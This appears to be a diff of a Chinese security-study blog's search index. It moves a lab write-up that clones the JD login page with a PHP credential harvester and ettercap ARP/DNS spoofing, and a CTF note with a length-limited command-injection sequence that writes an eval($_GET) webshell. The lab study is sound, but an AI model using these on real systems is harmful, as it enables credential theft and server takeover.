@@ -1279,44 +1279,6 @@ print(<span class="hljs-string">&#x27;flag=&#x27;</span>, flag)</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>diaoyu</title>
-    <url>/2020/07/18/diaoyu/</url>
-    <content><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><span id="more"></span>
-<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="https://i.loli.net/2020/11/30/LOSJIsP4luKBQxA.png" alt><br>修改index.html中的内容<br><img src="https://i.loli.net/2020/11/30/jyiqQNSlnEt43XL.png" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-variable">$nam</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span>
-<span class="hljs-variable">$pas</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-comment">//pass也一样</span>
-<span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;您已捕获京东账号及密码1个：&quot;</span> . <span class="hljs-string">&quot; 用户名 &quot;</span> . <span class="hljs-variable">$nam</span> . <span class="hljs-string">&quot; 密码 &quot;</span> . <span class="hljs-variable">$pas</span>;   <span class="hljs-comment">//保存捕获的用户名和密码</span>
-<span class="hljs-variable">$filed</span> = @fopen(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);   <span class="hljs-comment">//打开1.txt</span>
-@fwrite(<span class="hljs-variable">$filed</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$content</span>\n&quot;</span>);     <span class="hljs-comment">//将用户名和密码写入1.txt</span>
-<span class="hljs-meta">?&gt;</span>
-&lt;html&gt;
-&lt;head&gt;
-&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;
-		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">		</span>&#123;
-			window.history.back() <span class="hljs-comment">//后退+刷新</span>
-		&#125;
-&lt;/script&gt;
-&lt;/head&gt;
-&lt;body onload=<span class="hljs-string">&quot;goBack()&quot;</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
-<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p>
-<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com">www.jd.com</a>    ip:10.1.1.1</p>
-<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="https://i.loli.net/2020/11/30/gJ3jo84Zvlp1PLh.png" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）">www.jd.com看看网站发布是否成功）</a></p>
-<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="https://i.loli.net/2020/11/30/JVq4XPL85nHChi6.png" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="https://i.loli.net/2020/11/30/h76CQJgyL3VMka8.png" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问<a href="http://www.jd.com，指向为10.1.1.2">www.jd.com，指向为10.1.1.2</a><br>  <img src="https://i.loli.net/2020/11/30/oAzX9aDBfH2qRMu.png" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="https://i.loli.net/2020/11/30/yPgL23A1kcTfFED.png" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
-<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码然后点击登录">www.jd.com输入用户名密码然后点击登录</a></p>
-<p>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="https://i.loli.net/2020/11/30/OFsx34ZUAGBI9CP.png" alt></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>DNS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bugku代码审计</title>
     <url>/2020/09/14/decode/</url>
     <content><![CDATA[<h1 id="简单的代码审计"><a href="#简单的代码审计" class="headerlink" title="简单的代码审计"></a>简单的代码审计</h1><span id="more"></span>
@@ -1720,6 +1682,44 @@ password<span class="hljs-operator">=</span><span class="hljs-number">42</span><
         <tag>变量覆盖</tag>
         <tag>函数漏洞</tag>
         <tag>绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>diaoyu</title>
+    <url>/2020/07/18/diaoyu/</url>
+    <content><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><span id="more"></span>
+<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="https://i.loli.net/2020/11/30/LOSJIsP4luKBQxA.png" alt><br>修改index.html中的内容<br><img src="https://i.loli.net/2020/11/30/jyiqQNSlnEt43XL.png" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$nam</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span>
+<span class="hljs-variable">$pas</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-comment">//pass也一样</span>
+<span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;您已捕获京东账号及密码1个：&quot;</span> . <span class="hljs-string">&quot; 用户名 &quot;</span> . <span class="hljs-variable">$nam</span> . <span class="hljs-string">&quot; 密码 &quot;</span> . <span class="hljs-variable">$pas</span>;   <span class="hljs-comment">//保存捕获的用户名和密码</span>
+<span class="hljs-variable">$filed</span> = @fopen(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);   <span class="hljs-comment">//打开1.txt</span>
+@fwrite(<span class="hljs-variable">$filed</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$content</span>\n&quot;</span>);     <span class="hljs-comment">//将用户名和密码写入1.txt</span>
+<span class="hljs-meta">?&gt;</span>
+&lt;html&gt;
+&lt;head&gt;
+&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;
+		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">		</span>&#123;
+			window.history.back() <span class="hljs-comment">//后退+刷新</span>
+		&#125;
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body onload=<span class="hljs-string">&quot;goBack()&quot;</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com">www.jd.com</a>    ip:10.1.1.1</p>
+<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="https://i.loli.net/2020/11/30/gJ3jo84Zvlp1PLh.png" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）">www.jd.com看看网站发布是否成功）</a></p>
+<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="https://i.loli.net/2020/11/30/JVq4XPL85nHChi6.png" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="https://i.loli.net/2020/11/30/h76CQJgyL3VMka8.png" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问<a href="http://www.jd.com，指向为10.1.1.2">www.jd.com，指向为10.1.1.2</a><br>  <img src="https://i.loli.net/2020/11/30/oAzX9aDBfH2qRMu.png" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="https://i.loli.net/2020/11/30/yPgL23A1kcTfFED.png" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
+<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码然后点击登录">www.jd.com输入用户名密码然后点击登录</a></p>
+<p>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="https://i.loli.net/2020/11/30/OFsx34ZUAGBI9CP.png" alt></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>DNS</tag>
       </tags>
   </entry>
   <entry>
@@ -2696,6 +2696,114 @@ var_dump(<span class="hljs-keyword">$this</span>);
       </tags>
   </entry>
   <entry>
+    <title>rce</title>
+    <url>/2020/11/29/rce/</url>
+    <content><![CDATA[<p>看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。</p>
+<span id="more"></span>
+
+<h1 id="php中存在命令执行的常见函数"><a href="#php中存在命令执行的常见函数" class="headerlink" title="php中存在命令执行的常见函数"></a>php中存在命令执行的常见函数</h1><h2 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a>1.system</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line = system(&#x27;ls&#x27;, $return_var);</span>
+<span class="hljs-keyword">system</span>() 会将输出内容直接印出, 所以若于网页, 会将所有回传内容都显示于页面上.
+<span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line: 只能取得最后一行的内容</span>
+<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
+
+
+
+<h2 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a>2.shell_exec</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$output</span> = shell_exec(&#x27;ls&#x27;);</span>
+<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上.</span></code></pre>
+
+
+
+<h2 id="3-exec"><a href="#3-exec" class="headerlink" title="3.exec"></a>3.exec</h2><pre><code class="hljs gams">exec(<span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-symbol">$</span>output, <span class="hljs-symbol">$</span>return_var);
+<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上.</span>
+<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
+
+
+
+<h2 id="3-eval"><a href="#3-eval" class="headerlink" title="3.eval"></a>3.eval</h2><p>eval执行命令的原理与上面几个不同，eval 会把字符串作为PHP代码执行</p>
+<p>例如</p>
+<pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);
+<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;dir&#x27;);&quot;</span>);
+<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo &#x27;hello!&#x27;;&quot;</span>);
+
+<span class="hljs-comment">//注意：因为是将字符串当作php代码执行，所以相当于双引号中的代码再次执行了一次，所以里面的代码一定要符合php语法规则</span></code></pre>
+
+
+
+<h2 id="4-create-function"><a href="#4-create-function" class="headerlink" title="4.create_function"></a>4.create_function</h2><p><a href="https://www.php.net/manual/zh/function.create-function.php">php官方手册</a></p>
+<p>用法如下</p>
+<pre><code class="hljs autoit">$a = <span class="hljs-string">&#x27;system&#x27;</span><span class="hljs-comment">;</span>
+$b = <span class="hljs-string">&#x27;dir&#x27;</span><span class="hljs-comment">;</span>
+$c = <span class="hljs-string">&#x27;assert&#x27;</span><span class="hljs-comment">;</span>
+$d = <span class="hljs-string">&#x27;phpinfo()&#x27;</span><span class="hljs-comment">;</span>
+call_user_func($a,$b)<span class="hljs-comment">;</span>
+call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre>
+
+<h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5.call_user_func"></a>5.call_user_func</h2><pre><code class="hljs php"><span class="hljs-variable">$a</span> = create_function(<span class="hljs-string">&#x27;$code&#x27;</span>,<span class="hljs-string">&#x27;echo $code;&#x27;</span>);
+<span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;
+<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);
+<span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;
+<span class="hljs-variable">$b</span> = create_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);
+<span class="hljs-variable">$b</span>();
+
+<span class="hljs-comment">//和下面两个定义的函数作用相同</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span>&#123;
+	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$b&#x27;</span>;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>&#123;
+    phpinfo();
+&#125;
+</code></pre>
+
+
+
+<h1 id="限制字符长度的命令执行"><a href="#限制字符长度的命令执行" class="headerlink" title="限制字符长度的命令执行"></a>限制字符长度的命令执行</h1><p>实验环境为ubuntu nginx+php5.5</p>
+<p>实验目的</p>
+<p>通过命令执行想服务器写入一句话木马而达到控制服务器的目的</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>])&lt;=<span class="hljs-number">15</span>)&#123;
+    <span class="hljs-keyword">echo</span> strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
+    <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
+&#125;
+<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;It&#x27;s too long!&quot;</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>限制了参数1的字符长度为15</p>
+<p>然后将传递的参数放到shell_exec中执行</p>
+<p>突破点就是利用shell_exec函数将，我们的一句话木马写入到一个php文件中，获取shell。</p>
+<p>所以想要够的payload的为</p>
+<pre><code class="hljs url">?1&#x3D;echo shellcode &gt;1.php</code></pre>
+
+<p>将一句话木马写入到1.php中，我们知道一句话木马最短字符长度应该为21 ，这显然不能达到14个字符的限制要求</p>
+<p><img src="https://i.loli.net/2020/11/29/JoPC8xrVBXQOqmE.png" alt="muma.png"></p>
+<p>可以使用<code>echo text &gt;&gt;tmp.txt</code></p>
+<p>将字符串输出追加重定向，当前目录存在tmp.txt，则将tmp.txt的内容后面追加输出的字符串，会换行</p>
+<p>例如下面</p>
+<p><img src="https://i.loli.net/2020/11/29/L8A1xjieg6m9bGk.png" alt="echo.png"></p>
+<p>字符限制解决了，那么得知道换行后php代码还能正常执行吗，本地验证发现是没问题的</p>
+<p><img src="https://i.loli.net/2020/11/29/HWEXFrRjaDGp726.png" alt="yanzheng.png"></p>
+<p>下面就可以做这个题目了</p>
+<pre><code class="hljs php"><span class="hljs-comment">//为了每次写入更多的字符可以利用无后缀名的文件，最后用mv将其改为php文件</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \&lt;\?php &gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>\( &gt;&gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \<span class="hljs-variable">$_GET</span> &gt;&gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \[<span class="hljs-number">1</span>\] &gt;&gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \)\; &gt;&gt;<span class="hljs-number">1</span> 
+?<span class="hljs-number">1</span>=mv <span class="hljs-number">1</span> <span class="hljs-number">1.</span>php</code></pre>
+
+<p>之后访问1.php提交参数，获取想要的内容。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>cmd</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>正则表达式</title>
     <url>/2020/11/01/preg/</url>
     <content><![CDATA[<p>在一些代码审计的题目当中经常会出现使用正则表达过滤字符串的情况，所以有必要系统的学习一下！</p>
@@ -2939,114 +3047,6 @@ var_dump(<span class="hljs-keyword">$this</span>);
       <categories>
         <category>随笔</category>
       </categories>
-  </entry>
-  <entry>
-    <title>rce</title>
-    <url>/2020/11/29/rce/</url>
-    <content><![CDATA[<p>看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。</p>
-<span id="more"></span>
-
-<h1 id="php中存在命令执行的常见函数"><a href="#php中存在命令执行的常见函数" class="headerlink" title="php中存在命令执行的常见函数"></a>php中存在命令执行的常见函数</h1><h2 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a>1.system</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line = system(&#x27;ls&#x27;, $return_var);</span>
-<span class="hljs-keyword">system</span>() 会将输出内容直接印出, 所以若于网页, 会将所有回传内容都显示于页面上.
-<span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line: 只能取得最后一行的内容</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
-
-
-
-<h2 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a>2.shell_exec</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$output</span> = shell_exec(&#x27;ls&#x27;);</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上.</span></code></pre>
-
-
-
-<h2 id="3-exec"><a href="#3-exec" class="headerlink" title="3.exec"></a>3.exec</h2><pre><code class="hljs gams">exec(<span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-symbol">$</span>output, <span class="hljs-symbol">$</span>return_var);
-<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上.</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
-
-
-
-<h2 id="3-eval"><a href="#3-eval" class="headerlink" title="3.eval"></a>3.eval</h2><p>eval执行命令的原理与上面几个不同，eval 会把字符串作为PHP代码执行</p>
-<p>例如</p>
-<pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);
-<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;dir&#x27;);&quot;</span>);
-<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo &#x27;hello!&#x27;;&quot;</span>);
-
-<span class="hljs-comment">//注意：因为是将字符串当作php代码执行，所以相当于双引号中的代码再次执行了一次，所以里面的代码一定要符合php语法规则</span></code></pre>
-
-
-
-<h2 id="4-create-function"><a href="#4-create-function" class="headerlink" title="4.create_function"></a>4.create_function</h2><p><a href="https://www.php.net/manual/zh/function.create-function.php">php官方手册</a></p>
-<p>用法如下</p>
-<pre><code class="hljs autoit">$a = <span class="hljs-string">&#x27;system&#x27;</span><span class="hljs-comment">;</span>
-$b = <span class="hljs-string">&#x27;dir&#x27;</span><span class="hljs-comment">;</span>
-$c = <span class="hljs-string">&#x27;assert&#x27;</span><span class="hljs-comment">;</span>
-$d = <span class="hljs-string">&#x27;phpinfo()&#x27;</span><span class="hljs-comment">;</span>
-call_user_func($a,$b)<span class="hljs-comment">;</span>
-call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre>
-
-<h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5.call_user_func"></a>5.call_user_func</h2><pre><code class="hljs php"><span class="hljs-variable">$a</span> = create_function(<span class="hljs-string">&#x27;$code&#x27;</span>,<span class="hljs-string">&#x27;echo $code;&#x27;</span>);
-<span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;
-<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);
-<span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;
-<span class="hljs-variable">$b</span> = create_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);
-<span class="hljs-variable">$b</span>();
-
-<span class="hljs-comment">//和下面两个定义的函数作用相同</span>
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span>&#123;
-	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$b&#x27;</span>;
-&#125;
-
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>&#123;
-    phpinfo();
-&#125;
-</code></pre>
-
-
-
-<h1 id="限制字符长度的命令执行"><a href="#限制字符长度的命令执行" class="headerlink" title="限制字符长度的命令执行"></a>限制字符长度的命令执行</h1><p>实验环境为ubuntu nginx+php5.5</p>
-<p>实验目的</p>
-<p>通过命令执行想服务器写入一句话木马而达到控制服务器的目的</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-highlight_file(<span class="hljs-keyword">__FILE__</span>);
-<span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>])&lt;=<span class="hljs-number">15</span>)&#123;
-    <span class="hljs-keyword">echo</span> strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
-    <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
-&#125;
-<span class="hljs-keyword">else</span>&#123;
-    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;It&#x27;s too long!&quot;</span>);
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre>
-
-<p>限制了参数1的字符长度为15</p>
-<p>然后将传递的参数放到shell_exec中执行</p>
-<p>突破点就是利用shell_exec函数将，我们的一句话木马写入到一个php文件中，获取shell。</p>
-<p>所以想要够的payload的为</p>
-<pre><code class="hljs url">?1&#x3D;echo shellcode &gt;1.php</code></pre>
-
-<p>将一句话木马写入到1.php中，我们知道一句话木马最短字符长度应该为21 ，这显然不能达到14个字符的限制要求</p>
-<p><img src="https://i.loli.net/2020/11/29/JoPC8xrVBXQOqmE.png" alt="muma.png"></p>
-<p>可以使用<code>echo text &gt;&gt;tmp.txt</code></p>
-<p>将字符串输出追加重定向，当前目录存在tmp.txt，则将tmp.txt的内容后面追加输出的字符串，会换行</p>
-<p>例如下面</p>
-<p><img src="https://i.loli.net/2020/11/29/L8A1xjieg6m9bGk.png" alt="echo.png"></p>
-<p>字符限制解决了，那么得知道换行后php代码还能正常执行吗，本地验证发现是没问题的</p>
-<p><img src="https://i.loli.net/2020/11/29/HWEXFrRjaDGp726.png" alt="yanzheng.png"></p>
-<p>下面就可以做这个题目了</p>
-<pre><code class="hljs php"><span class="hljs-comment">//为了每次写入更多的字符可以利用无后缀名的文件，最后用mv将其改为php文件</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \&lt;\?php &gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>\( &gt;&gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \<span class="hljs-variable">$_GET</span> &gt;&gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \[<span class="hljs-number">1</span>\] &gt;&gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \)\; &gt;&gt;<span class="hljs-number">1</span> 
-?<span class="hljs-number">1</span>=mv <span class="hljs-number">1</span> <span class="hljs-number">1.</span>php</code></pre>
-
-<p>之后访问1.php提交参数，获取想要的内容。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>cmd</tag>
-      </tags>
   </entry>
   <entry>
     <title>python安全攻防</title>
@@ -4069,6 +4069,152 @@ ITEM_PIPELINES = &#123;
 <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
 
+<h1 id="mybatis-plus-generator"><a href="#mybatis-plus-generator" class="headerlink" title="mybatis-plus-generator"></a>mybatis-plus-generator</h1><p>MP的代码生成器，可以节约创建文件的时间</p>
+<h2 id="1-导入依赖"><a href="#1-导入依赖" class="headerlink" title="1.导入依赖"></a>1.导入依赖</h2><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--代码生成器--&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
